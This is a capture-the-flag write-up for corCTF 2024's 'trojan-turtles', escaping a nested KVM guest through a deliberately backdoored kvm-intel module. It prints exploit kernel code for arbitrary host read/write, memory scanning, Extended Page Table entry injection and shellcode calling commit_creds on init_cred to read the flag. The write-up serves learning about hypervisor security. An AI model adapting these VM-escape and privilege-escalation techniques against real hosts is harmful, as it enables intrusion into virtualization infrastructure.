---
layout: single
title:  "corCTF 2024: trojan-turtles writeup"
date: 2024-07-28
classes: wide
tags:
  - Exploitation
  - Sidechannels
  - x86_64
  - Architecture
  - Linux
  - CTF Writeup
---

This year I played corCTF with Shellphish, and we did pretty well -- placing 6th!
I worked on two challenges: 'trojan-turtles' and 'its-just-a-dos-bug-bro', in the end we solved both of them and both only had two solves by the end.

This will be a writeup for 'trojan-turtles', a challenge which involved exploiting a backdoored KVM kernel module from a guest VM to read the flag located on the parent VM.

NOTE: In this challenge we are given code execution in an L2 guest (guest inside another guest). When I refer to the 'host' in this writeup I'm referencing the parent VM of the one we are given code execution which has the vulnerability inserted in it, really it is the L1 guest but I think it is easier to just think of it as the host in the context of the challenge since the real host VM is transparent to us.

Here is the challenge description:
```
A mysterious person who goes by Tia Jan recently replaced our nested hypervisor's Intel KVM driver with a new driver.
Can you take a look at this and see if our systems have been compromised?

Note that the goal of this challenge is to escape from the L2 guest to the root user on the L1 guest.
You will need an Intel system with modern VMX extensions to debug this challenge.

The L1 guest is running a 6.9.0 kernel with the provided kconfig below. The L2 guest is running a 5.15.0-107 Ubuntu HWE kernel.
You can retrieve the necessary headers from the following links:
- https://packages.ubuntu.com/focal/linux-headers-5.15.0-107-generic
- https://packages.ubuntu.com/focal-updates/linux-hwe-5.15-headers-5.15.0-107

You can download the 6.9.0 kernel source at https://cdn.kernel.org/pub/linux/kernel/v6.x/linux-6.9.tar.xz
```

dist:
- [bzImage](/assets/corctf-trojan-turtles/dist/bzImage)
- [chall.qcow2](/assets/corctf-trojan-turtles/dist/chall.qcow2)
- [kconfig](/assets/corctf-trojan-turtles/dist/kconfig)
- [kvm-intel-original.ko](/assets/corctf-trojan-turtles/dist/kvm-intel-original.ko)
- [kvm-intel-new.ko](/assets/corctf-trojan-turtles/dist/kvm-intel-new.ko)
- [run.sh](/assets/corctf-trojan-turtles/dist/run.sh)
- [linux-headers-5.15.0-107-generic_5.15.0-107.117~20.04.1_amd64.deb](/assets/corctf-trojan-turtles/dist/linux-headers-5.15.0-107-generic_5.15.0-107.117~20.04.1_amd64.deb)
- [linux-hwe-5.15-headers-5.15.0-107_5.15.0-107.117~20.04.1_all.deb](/assets/corctf-trojan-turtles/dist/linux-hwe-5.15-headers-5.15.0-107_5.15.0-107.117~20.04.1_all.deb)

exploit:
[exploit.c](/assets/corctf-trojan-turtles/exploit.c)

## Background

Given that this challenge is about 'escaping KVM', I figured I'd provide some background on KVM and virtualization.

### what is it
KVM stands for 'Kernel-based Virtual Machine', and it provides an in-kernel api for creating virtual machines.
Essentially its purposes are to abstract a lot of the vendor specific implementations of virtualization features, e.g. Intel's VMX and AMD's SVM, and provide an API to userspace through which the privileged operations required for configuring virtualization may be performed.

The API is implemented as a device driver "/dev/kvm" with various commands that can be issued via `ioctl`.
This means, for example, that rather than needing to understand your processor vendor's virtualization features and write your own kernel module to set a VM's registers you can simply use the `KVM_SET_REGS` command.
You can read more about the KVM API in the kenel docs here: [https://docs.kernel.org/virt/kvm/api.html](https://docs.kernel.org/virt/kvm/api.html)

KVM can either be compiled into the kernel or compiled as a separate kernel module, e.g. kvm-intel.ko.
This depends on the config that was used to compile the kernel, if `CONFIG_KVM_INTEL` is set to `y` it will be compiled in to the kernel image, if it is set to 'm' it will be a kernel module.

When you execute qemu-system with `--enable-kvm` Qemu uses the KVM API rather than doing emulation.

### hardware assisted virtualization
There are several methods for creating virtual machines, including trap-and-emulate, hardware assisted virtualization, and full emulation. In the case of KVM, we are dealing with hardware assisted virtualization.
This is a really cool feature of modern CPUs where you can enter into an execution mode that uses a different state -- registers, address space, etc. -- which is isolated from your host's state.

Certain operations that the VM performs will cause a 'VMEXIT', exiting the virtualization for the host to handle the operations.
What operations cause VMEXITs is configurable but some common VMEXITs are the result of IO/MMIO operations, halts, the cpuid instruction, and shutdowns.
One especially relevant class of instructions that can be handled via VMEXITs is virtualization instructions, the same instructions that KVM will use to setup and modify VM state, which allows you to create hardware assisted VMs inside of other hardware assisted VMs.

Hardware assisted virtualization enables a better version of what trap-and-emulate wants to achieve, since with hardware virtualization not every privileged instruction needs to be emulated by the host kernel.
The processor can handle most of the privileged instructions in the virtualized guest's context but certain operations can still trap via a VMEXIT to the host kernel to be emulated.

## Diffing

Based on the description and the two versions of kvm-intel.ko attached to the challenge, we can assume the vulnerability is in the .ko and not in the bzImage.
Seeing this, I did some highly-advanced-binary-diffing(tm) by opening the kernel modules in binary ninja, exporting the HLIL of each to a file and diffing them.

The constant 0x1337babe stood out in the diff, probably the backdoor we were looking for:
```diff
>                 label_1f0ac:
>                 int64_t rax_8
>                 int64_t rsi_7
>                 rax_8, rsi_7 = kvm_get_dr(rbp, 0)
>
>                 if (rax_8 == 0x1337babe)
>                     int64_t rax_28 = kvm_get_dr(rbp, 1)
>                     int64_t rax_29
>                     rax_29, rsi_7 = kvm_get_dr(rbp, 2)
>                     *(r12 + (rax_28 << 3)) = rax_29
>
```

On closer inspection there were two locations where that constant appeared: in the functions `handle_vmread` and `handle_vmwrite`

## Analyzing the Backdoor
So we found suspicious code but what does that code do?

As I mentioned earlier, virtualization instructions can cause VMEXITs to be handled by the parent VM.
Two such virtualization instructions are 'vmread' and 'vmwrite', which correspond to the two handler functions modified in the provided kvm-intel.ko.

In the context of this challenge we have code execution in a guest VM of the VM that has the vulnerable KVM module.
So reasonably to hit the vulnerable code it would make sense that we just need to execute the related instruction in our VM.

Taking a closer look at those modified functions:

```c
int64_t handle_vmread(void* arg1)
    void* rbp = arg1
    void* r15 = *(arg1 + 0x1c78)
    void* gsbase
    int64_t rax = *(gsbase + 0x28)
    ...
                int64_t rax_9
                rax_9, rsi_1 = kvm_get_dr(rbp, 0)

                if (rax_9 == 0x1337babe)
                    rsi_1 = kvm_set_dr(rbp, 2, *(r15 + (kvm_get_dr(rbp, 1) << 3)))
```

We see in handle vmread that the introduced code is using the `kvm_get_dr` function to read the guest's debug registers.
In steps it:
- reads dr0 and checks that it's value matches `0x1337babe`
- reads dr1, shifts its value left by 3, adds it to whatever is in r15, and dereferences that value
- sets the value it read based on dr1 into dr0

From this we realized it is effectively an arbitrary read relative to the value in r15.
After reading the orignal source it became clear that this is the pointer to our VMCS (the one we just allocated in our guest), in the host's address space:
```c
static int handle_vmread(struct kvm_vcpu *vcpu)
{
    struct vmcs12 *vmcs12 = is_guest_mode(vcpu) ? get_shadow_vmcs12(vcpu)
                            : get_vmcs12(vcpu);
...
```

After a peek at the `handle_vmwrite` function:
```c
int64_t handle_vmwrite(void* arg1)
    void* rbp = arg1
    void* r12 = *(arg1 + 0x1c78)
    void* gsbase
    int64_t rax = *(gsbase + 0x28)
    ...
                    rax_8, rsi_7 = kvm_get_dr(rbp, 0)

                    if (rax_8 == 0x1337babe)
                        int64_t rax_28 = kvm_get_dr(rbp, 1)
                        int64_t rax_29
                        rax_29, rsi_7 = kvm_get_dr(rbp, 2)
                        *(r12 + (rax_28 << 3)) = rax_29
```

It became clear that this was an arbitrary write based on also relative to our VMCS based on the offset in dr1 and value in dr2.

## Hitting the Backdoor

Unfortunately hitting those handlers wasn't quite so simple.

To be able to execute the vmread/vmwrite instructions some setup is required.
Thankfully, I got some help from a teamate who is far more familiar with Intel's virtualization features than I am when figuring this part out.
The vmread and vmwrite instructions are for interacting with the "Virtual-Machine Control Structure" (VMCS), but at the moment in our VM the virtualization feature isn't enabled and we don't have a valid VMCS.

Also note that all of the virtualization instructions are privileged so the exploit code snippets in this post are part of a kernel module.

So first I enabled the VMX feature by setting the VMXE bit in cr4:
```c
    cr4 = native_read_cr4();
    cr4 |= 1ul << 13;
    native_write_cr4(cr4);
```

Next I had to create a valid VMXON region and VMCS, which is done by allocating two pages, setting the `vmcs_revision` value into the start of the page, then executing vmxon and vmptrld with the physical addresses of those pages:
```c
    vmxon_page = kzalloc(0x1000, GFP_KERNEL);
    vmptrld_page = kzalloc(0x1000, GFP_KERNEL);

    vmxon_page_pa = virt_to_phys(vmxon_page);
    vmptrld_page_pa = virt_to_phys(vmptrld_page);

    *(uint32_t *)(vmxon_page) = vmcs_revision();
    *(uint32_t *)(vmptrld_page) = vmcs_revision();

    res = vmxon(vmxon_page_pa);
    res = vmptrld(vmptrld_page_pa);
```
My teamate linked me this resource which provides some more specific information on this stuff and was extremely helpful: [https://wiki.osdev.org/VMX](https://wiki.osdev.org/VMX)

Finally, after doing that setup, we can execute the vmread/vmwrite instructions to hit the vulnerable code as such:

```c
    asm volatile("vmread %[field], %[output]\n\t"
          : [output] "=r" (vmread_value)
          : [field] "r" (vmread_field) : );

    asm volatile("vmwrite %[value], %[field]\n\t"
          :
          : [field] "r" (vmwrite_field),
            [value] "r" (vmwrite_value) : );
```

## Exploitation
The exploitation for this challenge was really fun, I think the most clear path for exploitation would have been to create a ROP chain in the host's address space, which reads the flag into the guest's address space, and cause a stack pivot to it.
But my teamate suggested a path that sounded more interesting: messing with Extended Page Table (EPT) feature to map the host's address space into the guest.

It sounded like a fun approach to try so I went for it, but I knew nothing about EPT and getting to the point where I could even interact with EPT was pretty challenging.

### the goal

So the plan is either:

Find the host's VMCS for the VM we are executing in and hijack the Extended Page Table Pointer (EPTP) in the structure to point to a forged EPT.

\- OR -

Find the existing EPT, by reading the EPTP, for our VM and insert entries to map all of the host's memory into the guest.

The approach I ended up going for was writing entries into the existing EPT for the guest.
The challenge here is we needed to find the VMCS for the guest VM to find the EPTP, and we will need information about the host's memory layout to know the offset to the existing EPT to modify and to walk one level of the EPT .

### finding the guest VMCS

The VMCS we created, and which we have relative arb read/write from, is allocated somewhere in the host's heap.
Which is convenient because it means we have access to the kernel's physmap, containing everything we could possibly want to read or write.

For this purpose I turned the arbitrary read in `handle_vmread` into this primitive, which just sets db0, db1, executes a vmread, then returns the value of dr2:
```c
static noinline uint64_t read_guy(unsigned long offset) {
    uint64_t val = 0;

    uint64_t vmread_field = 0;
    uint64_t vmread_value = 0;

    native_set_debugreg(0, 0x1337babe);
    native_set_debugreg(1, offset);
    asm volatile( "vmread %[field], %[output]\n\t"
              : [output] "=r" (vmread_value)
              : [field] "r" (vmread_field) : );
    val = native_get_debugreg(2);

    return val;
}
```

Now we were able to start scanning the host's memory to find the guest's VMCS!
But there was still the question of what value are we actually looking for when scanning...

Here is a truncated definition of the `struct vmcs12` that we are looking for:
```c
struct __packed vmcs12 {
    /* According to the Intel spec, a VMCS region must start with the
     * following two fields. Then follow implementation-specific data.
     */
    struct vmcs_hdr hdr;
    u32 abort;

    u32 launch_state; /* set to 0 by VMCLEAR, to 1 by VMLAUNCH */
    u32 padding[7]; /* room for future expansion */

    u64 io_bitmap_a;
    u64 io_bitmap_b;
    u64 msr_bitmap;
    u64 vm_exit_msr_store_addr;
    u64 vm_exit_msr_load_addr;
    u64 vm_entry_msr_load_addr;
    u64 tsc_offset;
    u64 virtual_apic_page_addr;
    u64 apic_access_addr;
    u64 posted_intr_desc_addr;
    u64 ept_pointer;
    ...
    natural_width guest_gdtr_base;
    natural_width guest_idtr_base;
    natural_width guest_dr7;
    natural_width guest_rsp;
    natural_width guest_rip;
    natural_width guest_rflags;
    ...
};
```

From the fields in this struct I looked for fields that would be fairly unique and that I knew the value of, I ended up choosing the `guest_idtr_base`.
Conveniently, the VMCS is required to be page aligned so I just needed to look for the IDT base address `0xfffffe0000000000` at offset 0x208 at at page granularity:
```c
static noinline int find_l1_vmcs(uint64_t *l1_vmcs_offset) {
    unsigned long long pos_offset = 0, neg_offset = 0;
    uint64_t zero_val = 0, pos_val = 0, neg_val = 0;
    uint64_t found_val = 0, found_offset = 0;
    uint64_t i = 0;

    zero_val = read_guy(0ull);
    pr_info("vmcs12[0] = %llx\n", zero_val);

    // scan in each direction looking for the guest_idtr_base field of the l1 vm
    for (i = 0; i < 0x4000; i++) {
        // from attaching to the l1 guest, the address of guest_idtr_base always has 0x208 in the lower 3 nibbles
        pos_offset = ((i * 0x1000) + 0x208) / 8;
        neg_offset = ((i * -1 * 0x1000) + 0x208) / 8;

        pos_val = read_guy(pos_offset);
        if (pos_val == IDT_BASE) {
            found_val = pos_val;
            found_offset = pos_offset;
            break;
        }

        neg_val = read_guy(neg_offset);
        if (neg_val == IDT_BASE) {
            found_val = neg_val;
            found_offset = neg_offset;
            break;
        }
    }
    if (found_val == 0) {
        pr_info("[exp]: IDT NOT FOUND :(\n");
        *l1_vmcs_offset = 0;
        return 0;
    } else {
        pr_info("[exp]: Found IDT in l1 at offset %lld; value: %llx\n", found_offset, found_val);
        *l1_vmcs_offset = found_offset;
        return 1;
    }
}
```
### finding the address of the nested VMCS

After finding this, I wanted to figure out the virtual address the arb read/write is relative to in the host.
I realized as I was reading the `handle_vmread` function that the `nested_vmx` struct holds a pointer to the nested guest's VMCS: `cached_vmcs12`.
It also contains some fields we know the values of: `vmxon_ptr` and `current_vmptr` which are the guest physical addresses for the VMXON region and VMCS we created.
```c
struct nested_vmx {
    /* Has the level1 guest done vmxon? */
    bool vmxon;
    gpa_t vmxon_ptr;
    bool pml_full;

    /* The guest-physical address of the current VMCS L1 keeps for L2 */
    gpa_t current_vmptr;
    /*
     * Cache of the guest's VMCS, existing outside of guest memory.
     * Loaded from guest memory during VMPTRLD. Flushed to guest
     * memory during VMCLEAR and VMPTRLD.
     */
    struct vmcs12 *cached_vmcs12;
    ...
}
```

So we can just scan for those two values:
```c
static noinline int find_nested_vmx(uint64_t *nested_vmx_offset) {
    unsigned long long pos_offset = 0, neg_offset = 0;
    uint64_t zero_val = 0, pos_val = 0, neg_val = 0;
    uint64_t found_val = 0, found_offset = 0;
    uint64_t i = 0;

    zero_val = read_guy(0ull);
    pr_info("vmcs12[0] = %llx\n", zero_val);

    for (i = 1; i < (0x4000*0x200); i += 2) {
        pos_offset = i;
        neg_offset = -i;

        pos_val = read_guy(pos_offset);
        if (pos_val == vmptrld_page_pa && read_guy(pos_offset-2) == vmxon_page_pa) {
            found_val = pos_val;
            found_offset = pos_offset;
            break;
        }
    }
    if (found_val == 0) {
        pr_info("[exp]: L1 VMCS NOT FOUND :(\n");
        *nested_vmx_offset = 0;
        return 0;
    } else {
        pr_info("[exp]: Found vmcs in l1 at offset %lld; value: %llx\n", found_offset, found_val);
        *nested_vmx_offset = found_offset;
        return 1;
    }
}
```

### leaking values

With this we were done with memory scanning!

We were then able to read fields of these two structures to find:
- Where the nested VMCS is in virtual memory, via `cached_vmcs12`
    - We can also apply a bitmask this address to get phsymap base
- The EPTP from the `ept_pointer` field on the `vmcs12` struct we found

```c
    // offset+1 to go from current_vmptr to cached_vmcs12
    l2_vmcs_addr = read_guy(nested_vmx_offset+1);
    pr_info("[exp]: YOU ARE HERE: %llx\n", l2_vmcs_addr);

    physbase = l2_vmcs_addr & ~0xfffffffull;
    pr_info("[exp]: probably physbase: %llx\n", l2_vmcs_addr & ~0xfffffff);

    eptp_value = read_guy(l1_vmcs_offset-50);
    pr_info("[exp]: eptp_value: %llx\n", eptp_value);
```

We calculated the offset to the EPT of the guest we are in using the knowledge of where our nested VMCS is, physmap base, and the EPTP (which is a physical address in the host):
```c
    ept_addr = physbase + (eptp_value & ~0xfffull);
    pr_info("[exp]: ept_addr: %llx\n", ept_addr);

    ept_offset = (ept_addr-l2_vmcs_addr) / 8;
    pr_info("[exp]: ept_offset: %llx\n", ept_offset);
```

### EPT hijacking
With this knowledge we were able to read and write the EPT of the guest, and at this point it was time for me to actually figure out how this EPT stuff works.

I'm just going to give a TL;DR on this because this blog is already really long...

It turns out that if you understand how regular x86\_64 page tables work, extended page tables are very intuitive.
If you don't understand those, then [learn how those work first](https://zolutal.github.io/understanding-paging/).
- First the pagetables in the guest are walked as normal to convert the guest virtual address to a guest physical address
- Next, the EPTP is used to determine the address of the physical address of the EPT in the host, you can think of this as the cr3 of EPT
- Then a pagewalk starts on the EPT page tables converting the guest physical address to a host physical address
    - The procedure for this pagewalk is very similar to a normal pagewalk, you calculate the offsets into each level of the pagetable in the same way you do for linear to physical address conversion (e.g. shift right by 12, 9-bit bitmasks, etc.)

Also similar to normal paging there are huge pages in EPT!
So the plan was to construct an EPT 1GB Huge Page mapping, which needs to be in the PDPT (3rd level).

I walked one level of EPT by reading the first entry in the PML4 (4th level) to get the physical address of the PDPT.
There was only one entry in the EPT PGD because of the amount of RAM the VM had wasn't nearly enough to justify a second top level entry.

Here is what the EPT PML4 and PDPT look like in memory:
```bash
gef> # physmap base:
gef> p/x 0xffff8d74c0000000
$22 = 0xffff8d74c0000000

gef> # EPTP value:
gef> p/x 0x299405e
$23 = 0x299405e

gef> # EPT PML4 addr:
gef> p/x 0xffff8d74c0000000 + (0x299405e & ~0xfff)
$24 = 0xffff8d74c2994000
gef> # EPT PML4 contents:
gef> x/4gx 0xffff8d74c2994000
0xffff8d74c2994000:     0x0000000002482907      0x0000000000000000
0xffff8d74c2994010:     0x0000000000000000      0x0000000000000000

gef> # the EPT PML4 has one entry: 0x0000000002482907
gef> # EPT PDPT addr:
gef> p/x 0xffff8d74c0000000 + (0x0000000002482907 & ~0xfff)
$25 = 0xffff8d74c2482000
gef> # EPT PDPT contents:
gef> x/8gx 0xffff8d74c2482000
0xffff8d74c2482000:     0x0000000002377907      0x0000000000000000
0xffff8d74c2482010:     0x0000000000000000      0x000000000254d907
0xffff8d74c2482020:     0x0000000000000000      0x0000000000000000
0xffff8d74c2482030:     0x0000000000000000      0x0000000000000000
```

To insert the malicious EPT entry we wrote `0x987` into an entry in the EPT PDPT which means -- map 1GB of host physical memory starting from physical address zero to the guest physical address associated with this entry.
- The 0x9 nibble maps to the 'accessed' and 'ignored' bits (oops lol these don't matter)
- The 0x8 nibble maps to the page size bit that indicates this is 1GB mapping
- The 0x7 nibble maps to the read, write, and 'mode-based execute' (whether ring 0 in the guest can fetch instructions from this memory) bits

Peep the Intel SDM Vol. 3C Section 29.3.2 if you want specifics on the layouts of these entries.

Here is walking the EPT PML4 and installing the malicious PDPT entry in C:
```c
    // read first entry in ept to get the PML4E
    pml4e_value = read_guy(ept_offset);
    pr_info("[exp]: pml4e_value: %llx\n", pml4e_value);

    pml4e_addr = physbase + (pml4e_value & ~0xfffull);
    pr_info("[exp]: pml4e_addr: %llx\n", pml4e_addr);

    pml4e_offset = (pml4e_addr-l2_vmcs_addr) / 8;
    pr_info("[exp]: pml4e_offset: %llx\n", pml4e_offset);

    // at 6GB will be an identity mapping of the l1 memory in l2
    write_guy(pml4e_offset + 6, 0x987);
```

Then we were able to just mess with the guest's page tables a bit and create a 1GB mapping that points to the guest physical address assocated with the malicious EPT  PDPT entry we installed.
The entry was installed at the 6th entry in the EPT PDPT which associates it with the physical address `6<<30` (6GB), so we made a PDPT in the guest's page tables point to that address:

```c
    cr3 = read_cr3();
    pgd = (cr3 & ~0xfffull) + page_offset_base;
    pr_info("[exp]: pgd: %llx\n", pgd);

    pgde_page = kzalloc(0x1000, GFP_KERNEL);
    pgde_page_pa = virt_to_phys(pgde_page);

    pgd[272] = pgde_page_pa | 0x7;

    // huge and rwxp
    l2_entry = 0x180000000 | (1<<7) | 0x3;

    pgde_page[0] = l2_entry;

    // in THEORY I can access memory at 0xffff880000000000 now
    pr_info("TEST: %llx\n", *((uint64_t *)0xffff880000000000));
```

This entry makes it so that at virtual address `0xffff880000000000` is a 1GB mapping of the host's physical memory in our guest.

I was able to validate this by using gdb to compare the value the `pr_info` output to dmesg with the actual value at physical address zero:
```
gef> xp/gx 0
0x0000000000000000:    0xf000ff53f000ff53                       |  S...S...
```
```
[   99.596421] [exp]: pgd: ffff947a42a96000
[   99.597523] clocksource: Long readout interval, skipping watchdog check: cs_nsec: 9953621305 wd_nsec: 1
[   99.597611] TEST: f000ff53f000ff53
```

### arbitrary physical memory read/write
At this point we had fully arbitrary physical memory read/write, e.g. we can read/write pages regardless of what their permissions are in the host by going through the mapping we established in the guest, which effectively turns this into a shellcoding exercise.

We scanned memory to find the address of the `handle_vmread` function in physical memory and overwrote it with the following payload, which just privescs the current thread, then opens and reads the flag file into memory:
```c
    push rax
    push rbx
    push rcx
    push rdx
    push r9
    push r10
    push r11
    push r12
    push r13
    push r14
    push rdi
    push rsi

    // get kaslr base
    mov rax, 0xfffffe0000000004
    mov rax, [rax]
    sub rax, 0x1008e00

    // r12 is kaslr_base
    mov r12, rax

    // commit_creds
    mov r13, r12
    add r13, 0xbdad0

    // init_cred
    mov r14, r12
    add r14, 0x1a52ca0

    mov rdi, r14
    call r13

    // filp_open
    mov r11, r12
    add r11, 0x292420

    // push /root/flag.txt
    mov rax, 0x7478742e6761
    push rax
    mov rax, 0x6c662f746f6f722f
    push rax
    mov rdi, rsp

    // O_RDONLY
    mov rsi, 0
    call r11

    // r10 is filp_ptr
    mov r10, rax

    // kernel_read
    mov r11, r12
    add r11, 0x294c70

    // writeable kernel address
    mov r9, r12
    add r9, 0x18ab000

    mov rdi, r10
    mov rsi, r9
    mov rdx, 0x100
    mov rcx, 0

    call r11

    pop rax
    pop rax

    pop rsi
    pop rdi
    pop r13
    pop r14
    pop r12
    pop r11
    pop r10
    pop r9
    pop rdx
    pop rcx
    pop rbx
    pop rax
```

Then just trigger the shellcode by executing a vmread, and get the flag by reading it out of the host's memory:

```c
    // do it
    read_guy(0);

    // scan for flag in memory
    for (i = 0; i < 1024ull << 20; i+= 0x1000) {
        if (!memcmp(0xffff880000000000 + i, "corctf{", 7)) {
            pr_info("flag: %s\n", 0xffff880000000000 + i);
            break;
        }
    }
```

Incredibly this worked first try on remote! :)

```
[  127.014896] [exp]: Found vmcs in l1 at offset 730021; value: 2adb000
[  127.014958] [exp]: YOU ARE HERE: ffff9aa4c1f6a000
[  127.014959] [exp]: probably physbase: ffff9aa4c0000000
[  127.014985] [exp]: eptp_value: 244f05e
[  127.014986] [exp]: ept_addr: ffff9aa4c244f000
[  127.014986] [exp]: ept_offset: 9ca00
[  127.015012] [exp]: pml4e_value: 2ba4907
[  127.015013] [exp]: pml4e_addr: ffff9aa4c2ba4000
[  127.015013] [exp]: pml4e_offset: 187400
[  127.015036] [exp]: pgd: ffff8c6102a80000
[  127.016681] clocksource: Long readout interval, skipping watchdog check: cs_nsec: 5383022626 wd_nsec: 5383019837
[  127.016772] TEST: f000ff53f000ff53
[  127.018707] found handle_vmread page at: ffff8800028fd000
[  127.018708] handle_vmread at: ffff8800028fd4d0
[  127.053129] flag: corctf{KvM_3xpl01t5_@r3_5ucH_a_p@1n_1n_Th3_a55!!!}
```

## wrap up

This challenge was super fun and very relevant with Google's KVM CTF starting up not too long ago.
It was awesome learning about EPT and getting a better understanding of some of the internals of KVM, I hope you learned something from reading this!
Shoutout to the author [FizzBuzz101](https://www.willsroot.io/) for creating the challenge!
